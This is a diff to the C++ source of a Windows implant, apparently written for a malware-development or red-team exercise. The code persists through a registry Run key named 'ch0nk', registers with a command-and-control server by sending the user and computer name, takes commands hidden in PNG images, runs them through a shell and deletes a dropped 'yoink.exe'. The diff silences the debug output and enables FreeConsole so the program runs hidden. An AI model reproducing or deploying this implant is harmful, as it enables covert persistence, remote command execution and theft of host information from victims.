@@ -29,12 +29,12 @@ inline bool file_exists (std::string &name, std::string hash) {
         //sha256->Update( (BYTE*) test, size);
         sha256->Digest();
 
-        // wprintf(L"Printing the hash!\n");
+        // // wprintf(L"Printing the hash!\n");
         // for(DWORD i=0; i < sha256->cbHash; i++){
-        //     wprintf(L"%02x", sha256->pbHash[i]);
+        //     // wprintf(L"%02x", sha256->pbHash[i]);
         // }
         std::string file_hash((char*) (sha256->pbHash), sha256->cbHash);
-        // wprintf(L"\n");
+        // // wprintf(L"\n");
 
         // make sure to delete the sha256 value that we created.
         delete  sha256;
@@ -101,7 +101,7 @@ std::string execute_shell(wchar_t* command) {
     PROCESS_INFORMATION pi = {0};
     ZeroMemory( &pi, sizeof(PROCESS_INFORMATION) );
     // create the process 
-    // printf("**************************TEST**********************************\n");
+    //// printf("**************************TEST**********************************\n");
     if (!CreateProcessW
         (NULL,
         cmdLine, // Command line
@@ -115,7 +115,7 @@ std::string execute_shell(wchar_t* command) {
         &pi) // recieves PROCESS_INFORMATION
      )
     {
-        printf("Error Creating Process: %ld\n", GetLastError());
+       // printf("Error Creating Process: %ld\n", GetLastError());
         return output;
         // error handling...
     }
@@ -140,7 +140,7 @@ std::string execute_shell(wchar_t* command) {
                     if( ! bSuccess || dwRead ==0) break;
                     // chBuf[dwRead] = '\n';
                     chBuf[dwRead] = '\0';
-                    // printf("%s",chBuf);
+                    //// printf("%s",chBuf);
                     output.append(chBuf);
 
                 }
@@ -159,10 +159,10 @@ std::string execute_shell(wchar_t* command) {
 }
 
 int set_run_key() {
-    // printf("Start of reg key function....\n");
+    //// printf("Start of reg key function....\n");
     LPSTR filepath[260];
     GetModuleFileNameA(NULL, (LPSTR)filepath, 260);
-    // printf("After get module file name....\n");
+    //// printf("After get module file name....\n");
 
     LPSTR lpData[260];
 
@@ -170,8 +170,8 @@ int set_run_key() {
     strcat((char*) lpData, (char*) filepath);
     strcat((char*) lpData, "\"");
 
-    // printf("%s\n", (char*)lpData);
-    // printf("String Length: %d\n", strlen((char*)lpData));
+    //// printf("%s\n", (char*)lpData);
+    //// printf("String Length: %d\n", strlen((char*)lpData));
     
 
 
@@ -182,7 +182,7 @@ int set_run_key() {
     // set registry value
     LSTATUS lStatus = RegSetValueExA(regKey, "ch0nk", 0, REG_SZ, (BYTE *) lpData, (DWORD) strlen((char*)lpData) );
     if (lStatus != 0){
-        printf("****************Error %ld\n", lStatus);
+       // printf("****************Error %ld\n", lStatus);
         RegCloseKey(regKey);
         return -1;
     }
@@ -214,7 +214,7 @@ std::string get_guid() {
 
 std::string register_implant(char* compName, char* userName) {
     // Make each section of the header separately, then concat together
-    std::wcout << L"********** START OF REGISTER FUNCTION ***********" << std::endl;
+  // std::cout << L"********** START OF REGISTER FUNCTION ***********" << std::endl;
 
     std::string header = "auth=507261697365204c6f7264204265726e617264696e6921";
     std::string guid = "&guid=";
@@ -228,9 +228,9 @@ std::string register_implant(char* compName, char* userName) {
     computer.append(compName);
 
     header.append(guid).append(user).append(computer);
-    wprintf(L"header = %s\n", header.c_str());
+    // wprintf(L"header = %s\n", header.c_str());
 
-    // wprintf(L"header length = %d\n", strlen(header));
+    // // wprintf(L"header length = %d\n", strlen(header));
     // std::stringstream hex_header;
     std::string hex_data = "hex=";
 
@@ -238,7 +238,7 @@ std::string register_implant(char* compName, char* userName) {
     hex_data.append(header);
     // std::wcout << hex_data << std::endl;
     std::string http_data(hex_data.begin(), hex_data.end());
-    // wprintf(L"hex data= %s\n", hex_data.c_str());
+    // // wprintf(L"hex data= %s\n", hex_data.c_str());
 
     // construct the optional headers
     std::wstring first_header =  L"Authorization: Imagine thinking you could decrypt this. HAHAHA!\r\n";
@@ -273,11 +273,11 @@ std::string register_implant(char* compName, char* userName) {
 
 std::string checkin_implant(std::string response, std::wstring imageNum) {
     // Make each section of the header separately, then concat together
-    std::wcout << L"********** START OF CHECK-IN FUNCTION" << std::endl;
+  // std::cout << L"********** START OF CHECK-IN FUNCTION" << std::endl;
 
     std::string guid_temp = get_guid();
 
-    // wprintf(L"header length = %d\n", strlen(header));
+    // // wprintf(L"header length = %d\n", strlen(header));
     // std::stringstream hex_header;
     std::string hex_data = "hex=";
     stream2hex(response, response);
@@ -287,7 +287,7 @@ std::string checkin_implant(std::string response, std::wstring imageNum) {
     // std::cout << hex_data << std::endl;
     // std::cout << "**************************HEX DATA*******************************" << std::endl;
     std::string http_data(hex_data.begin(), hex_data.end());
-    // wprintf(L"hex data= %s\n", hex_data.c_str());
+    // // wprintf(L"hex data= %s\n", hex_data.c_str());
 
     // construct the optional headers
     
@@ -330,14 +330,14 @@ std::string checkin_implant(std::string response, std::wstring imageNum) {
 int wmain() {
 
     // TODO: UNCOMMENT FREE CONSOLE FOR FINAL PROGRAM!
-    // FreeConsole();
+    FreeConsole();
     std::string filename = "C:\\malware\\ch0nky.txt";
     std::string hash = "E3B0C44298FC1C149AFBF4C8996FB92427AE41E4649B934CA495991B7852B855";
     // checks for the "ch0nky.txt file"
     if (!file_exists(filename, hash)){
         return -1;
     }
-    printf("ch0nky.txt exists: %s\n", file_exists(filename, hash) ? "true" : "false");
+   // printf("ch0nky.txt exists: %s\n", file_exists(filename, hash) ? "true" : "false");
 
 
 
@@ -345,19 +345,19 @@ int wmain() {
 
     // grab the guid
     std::string guid = get_guid();
-    printf("Guid: %s\n", guid.c_str());
+   // printf("Guid: %s\n", guid.c_str());
 
     // grab the computer name
     char compName[MAX_COMPUTERNAME_LENGTH + 1];
     DWORD maxCompNameLength = MAX_COMPUTERNAME_LENGTH + 1;
     GetComputerNameA(compName, &maxCompNameLength );
-    // printf("Computer Name: %s\n", compName);
+    //// printf("Computer Name: %s\n", compName);
 
     // grab the user name
     char userName[UNLEN + 1];
     DWORD maxUserNameLength = UNLEN + 1;
     GetUserNameA(userName, &maxUserNameLength );
-    // printf("User Name: %s\n", userName);
+    //// printf("User Name: %s\n", userName);
 
     // TODO right before registering. 
     Sleep(1000);
@@ -368,7 +368,7 @@ int wmain() {
     // attempt to register with the c2
     do {
         if (strcmp("OK", output.c_str()) == 0){
-            std::wcout << L"BROKEN OUT OF FIRST DO WHILE" << std::endl;
+          // std::cout << L"BROKEN OUT OF FIRST DO WHILE" << std::endl;
             break;
         }
         
@@ -400,7 +400,7 @@ int wmain() {
             char temp_path[MAX_PATH + 1];
             DWORD bufferLen = MAX_PATH + 1;
             GetTempPathA(bufferLen, temp_path);
-            printf("Temp Path: %s\n", temp_path);
+           // printf("Temp Path: %s\n", temp_path);
             std::string image_path = "\"";
             image_path.append(temp_path);
             if (int_imageNum != 0) {
@@ -410,7 +410,7 @@ int wmain() {
             }
             
             command.append(image_path.c_str());
-            printf("Final command: %s\n", command.c_str());
+           // printf("Final command: %s\n", command.c_str());
 
             std::wstring command_temp(command.begin(), command.end());
             wchar_t* wCommand = (wchar_t*) command_temp.c_str();
@@ -430,10 +430,10 @@ int wmain() {
                 unsigned char *img = stbi_load(img_path.c_str(), &width, &height, &channels, 0);
                 if (img == NULL)
                 {
-                    printf("RIP for image loading");
+                   // printf("RIP for image loading");
                     continue;
                 }
-                printf("Image loaded with width: %dpx, height: %dpx, and channels: %d\n", width, height, channels);
+               // printf("Image loaded with width: %dpx, height: %dpx, and channels: %d\n", width, height, channels);
 
                 size_t img_size = width * height * channels;
 
@@ -443,13 +443,13 @@ int wmain() {
                 unsigned char *altered_img = (unsigned char *)malloc(altered_img_size);
                 if (altered_img == NULL)
                 {
-                    printf("RIP for memory allocation for altered img");
+                   // printf("RIP for memory allocation for altered img");
                     continue;
                 }
 
 
                 int max_pixels = width * height;
-                std::cout << "Max Pixels: " << max_pixels << std::endl;
+              // std::cout << "Max Pixels: " << max_pixels << std::endl;
 
                 std::vector<std::string> messages{"", "", ""};
                 messages = decode_png(img, max_pixels, width, height, channels, img_size);
@@ -512,11 +512,11 @@ int wmain() {
             } else {
                 delete_file.append("yoink.exe");
             }
-            std::cout << "File to remove: " << delete_file << std::endl;
+          // std::cout << "File to remove: " << delete_file << std::endl;
             if (remove(delete_file.c_str()) == 0){
-                std::cout << "File successfully deleted" << std::endl;
+              // std::cout << "File successfully deleted" << std::endl;
             } else {
-                printf( "%s\n", strerror( errno ) );
+               // printf( "%s\n", strerror( errno ) );
             }
         }
     }
